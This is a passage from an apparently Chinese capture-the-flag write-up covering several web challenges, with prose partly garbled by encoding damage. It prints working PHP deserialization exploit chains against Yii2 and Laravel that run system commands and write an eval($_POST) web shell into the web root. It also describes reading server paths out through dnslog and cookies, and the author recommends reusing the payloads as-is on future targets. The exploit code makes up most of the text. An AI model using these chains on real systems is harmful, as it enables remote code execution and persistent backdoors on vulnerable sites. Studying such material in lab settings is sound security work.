class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;passthru&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;tac /flag&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230107211300165.png" alt="image-20230107211300165"></p><p>system   å¯ä»¥åˆ©ç”¨passthruæ›¿ä»£ã€‚</p><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/111259943">https://blog.csdn.net/xuandao_ahfengren/article/details/111259943</a>  yiiæ¡†æ¶æ¼æ´è§£é‡Š</p><p>Yiiæ˜¯ä¸€å¥—åŸºäºç»„ä»¶ã€ç”¨äºå¼€å‘å¤§å‹Webåº”ç”¨çš„é«˜æ€§èƒ½PHPæ¡†æ¶ã€‚<strong>Yii2 2.0.38</strong> ä¹‹å‰çš„ç‰ˆæœ¬å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œç¨‹åºåœ¨è°ƒç”¨unserialize æ—¶ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ„é€ ç‰¹å®šçš„æ¶æ„è¯·æ±‚æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><p>ä¸‹æ¬¡é‡åˆ°ç›´æ¥æ‹¿ç°æˆçš„é“¾æ¥æ‰“å°±å¥½äº†ã€‚</p><h2 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h2><p>æºç </p><p>å’Œweb261ä¸€æ ·éƒ½æ˜¯yiiæ¼æ´çš„ååºåˆ—åŒ–é“¾åˆ©ç”¨ã€‚</p><p>æ˜¾ç„¶è¿™é“é¢˜çš„è¯ç”¨ä¸äº†ä¸Šä¸€é¢˜çš„payloadäº†    â€”â€”&gt;  å°±æ˜¯æŠŠsystemæ›¿æ¢æˆpassthru</p><p>é‚£æˆ‘ä»¬å°±å¾—æ¢ä¸€ä¸ªæ–¹æ³•äº†</p><p>å°±æ˜¯è¿›è¡Œå†™ç ï¼Œé‚£æˆ‘ä»¬å¾—æ‰¾åˆ°å½“å‰ç›®å½•çš„è·¯å¾„</p><p>(ä¸æ˜¯/var/www/html)  è¯•è¿‡äº†ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨danslog.cnè¿›è¡Œæ•°æ®å¤–å¸¦ã€‚</p><p><img src="../images/image-20230107213710478.png" alt="image-20230107213710478"></p><p>åœ¨web267ä¸­æŸ¥å‡ºæ¥çš„ã€‚</p><p><img src="../images/image-20230107213918120.png" alt="image-20230107213918120"></p><p>è§£ç å¾—åˆ°å½“å‰æ–‡ä»¶é»˜è®¤è·¯å¾„ã€‚</p><p>exp(ä»¥åé‡åˆ°yiiæ¡†æ¶çš„é¢˜ï¼Œå¯ä»¥æ‹¿æ¥ç›´æ¥æ‰“å°±è¡Œäº†)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-03 21:55:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-04 01:25:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &#x27;<span class="title class_">echo</span> &quot;&lt;?<span class="title class_">php</span> <span class="title class_">eval</span>(\$<span class="title class_">_POST</span>[1]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span><span class="string">&quot; &gt;/var/www/html/basic/web/1.php&#x27;);</span></span><br><span class="line"><span class="string">    echo(base64_encode(serialize(<span class="subst">$exp</span>)));</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230107214350377.png" alt="image-20230107214350377"></p><p>ç„¶åå»è®¿é—®1.phpè¿›è¡Œrceã€‚</p><p><img src="../images/image-20230107214429533.png" alt="image-20230107214429533"></p><p><img src="../images/image-20230107214527415.png" alt="image-20230107214527415"></p><p><strong>(ä¸‹æ¬¡é‡åˆ°yiiçš„é¢˜ç›®çš„è¯ï¼Œç›´æ¥æ‹¿è¿™ä¸ªpaylaodæ¥æ‰“å°±è¡Œäº†)</strong></p><p>å’Œweb268ä¸€æ ·ã€‚</p><h2 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h2><p>æºç </p><p>å’Œweb268ä¸€æ¨¡ä¸€æ ·ã€‚</p><h2 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h2><p>æºç </p><p><img src="../images/image-20230107232547459.png" alt="image-20230107232547459"></p><p>è¿™æ˜¯ä¸€ä¸ªLaravelçš„phpæ¡†æ¶ï¼Œæˆ‘ä»¬ç›´æ¥ä¸Šç½‘æ‰¾é“¾å­æ‰“å°±è¡Œäº†ã€‚</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-05 22:14:15</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-05 22:21:46</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">PendingCommand</span>&#123;</span><br><span class="line"><span class="title class_">protected</span> $<span class="title class_">command</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$command</span>, <span class="variable">$parameters</span>,<span class="variable">$class</span>,<span class="variable">$app</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;command = <span class="variable">$command</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test=<span class="variable">$class</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;app=<span class="variable">$app</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">GenericUser</span>&#123;</span><br><span class="line"><span class="title class_">protected</span> $<span class="title class_">attributes</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$attributes</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;attributes = <span class="variable">$attributes</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">Application</span>&#123;</span><br><span class="line"><span class="title class_">protected</span> $<span class="title class_">hasBeenBootstrapped</span> = <span class="title class_">false</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$bindings</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$bind</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;bindings=<span class="variable">$bind</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"><span class="title class_">echo</span> <span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>(&quot;<span class="title class_">system</span>&quot;,<span class="title class_">array</span>(&#x27;<span class="title class_">tac</span> /<span class="title class_">flag</span>&#x27;),<span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>\<span class="title class_">GenericUser</span>(<span class="title class_">array</span>(&quot;<span class="title class_">expectedOutput</span>&quot;=&gt;<span class="title class_">array</span>(&quot;0&quot;=&gt;&quot;1&quot;),&quot;<span class="title class_">expectedQuestions</span>&quot;=&gt;<span class="title class_">array</span>(&quot;0&quot;=&gt;&quot;1&quot;))),<span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Application</span>(<span class="title class_">array</span>(&quot;<span class="title class_">Illuminate</span>\<span class="title class_">Contracts</span>\<span class="title class_">Console</span>\<span class="title class_">Kernel</span>&quot;=&gt;<span class="title class_">array</span>(&quot;<span class="title class_">concrete</span>&quot;=&gt;&quot;<span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Application</span>&quot;))))));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ°æ—¶å€™å¯ä»¥åªåœ¨è„šæœ¬é‡Œä¿®æ”¹æ‰§è¡Œçš„å‘½ä»¤å°±è¡Œäº†ã€‚</p><h2 id="web272"><a href="#web272" class="headerlink" title="web272"></a>web272</h2><p>æºç </p><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œéƒ½æ˜¯Laravelæ¡†æ¶</p><p>ä¸Šé¢˜çš„paylaodç”¨ä¸äº†äº†</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-05 22:27:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-05 22:39:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Line</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">EvalLoader</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">line</span> = <span class="title class_">new</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>\<span class="title class_">Line</span>();</span><br><span class="line">    <span class="variable">$mockdefinition</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockDefinition</span>(<span class="variable">$line</span>,<span class="string">&quot;&lt;?php file_put_contents(&#x27;/app/public/1.php&#x27;,&#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27;);&quot;</span>);</span><br><span class="line">    <span class="variable">$evalloader</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Loader\EvalLoader</span>();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Bus\Dispatcher</span>(<span class="keyword">array</span>(<span class="variable">$evalloader</span>,<span class="string">&#x27;load&#x27;</span>));</span><br><span class="line">    <span class="variable">$queuedcommand</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Console\QueuedCommand</span>(<span class="variable">$mockdefinition</span>);</span><br><span class="line">    <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$dispatcher</span>,<span class="variable">$queuedcommand</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢ä¸ºå•¥çŸ¥é“å½“å‰ç›®å½•æ˜¯/app/public/,å¯ä»¥ç”¨å¤–å¸¦çš„æ–¹æ³•ï¼Œè¿™é‡Œä¸ç”¨danlogäº†ï¼Œç”¨cookie.</p><p><img src="../images/image-20230107233821691.png" alt="image-20230107233821691"></p><p>ä¿®æ”¹ä¸€ä¸‹è¿™é‡Œï¼Œsetcookieç¬¬ä¸€ä¸ªå‚æ•°æ˜¯cookieçš„åå­—2ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å†…å®¹ã€‚</p><p><img src="../images/image-20230107234002112.png" alt="image-20230107234002112"></p><p>è§£ç å‡ºæ¥æ˜¯<code>/app/public</code>ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾€è¿™ä¸ªè·¯å¾„é‡Œè¾¹è¿›è¡Œå†™ç äº†ã€‚</p><p>ä¸Šé¢çš„expç›´æ¥ç”¨å°±è¡Œäº†ã€‚</p><p><strong>è¿™é‡ŒåŠ ä¸€ä¸ªä¸ºä»€ä¹ˆè¦åœ¨æœ¨é©¬é‡ŒåŠ è½¬ä¹‰å­—ç¬¦çš„åŸå› </strong></p><p><img src="../images/image-20230107234959347.png" alt="image-20230107234959347"></p><p><code>\$</code>è¡¨ç¤ºçš„æ˜¯$è¿™ä¸ªæ˜¯æœ‰ç‰¹æ®Šç”¨é€”çš„ï¼Œä¸æ˜¯ç®€å•çš„è¡¨ç¤ºé’±çš„æ„æ€ã€‚å› ä¸ºæ˜¯åœ¨å­—ç¬¦ä¸²é‡Œå†™çš„ï¼Œè¯†åˆ«ä¸äº†ï¼Œæ‰€ä»¥å¾—åŠ ä¸ªè½¬ä¹‰å­—ç¬¦<code>\</code></p><h2 id="web273"><a href="#web273" class="headerlink" title="web273"></a>web273</h2><p>æºç </p><p>åˆæ˜¯ä¸€é“Laravelæ¡†æ¶çš„é¢˜</p><p>ç”¨ä¸Šä¸€é¢˜çš„é“¾å­å°±å¯ä»¥äº†ã€‚</p><p>laravelç”¨åˆ°çš„ç‰ˆæœ¬åˆ†åˆ«æ˜¯  5.7å’Œ5.8çš„ã€‚</p><h2 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h2><p>æºç </p><p><img src="../images/image-20230108000026004.png" alt="image-20230108000026004"></p><p>è¿™æ¬¡è½®åˆ°thinkphpäº†ã€‚</p><p><img src="../images/image-20230108001823611.png" alt="image-20230108001823611"></p><p>å‘ç°ååºåˆ—åŒ–å…¥å£ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å°±ä¸Šç½‘å»æ‰¾payloadå°±è¡Œäº†ã€‚</p><p>exp</p><figure 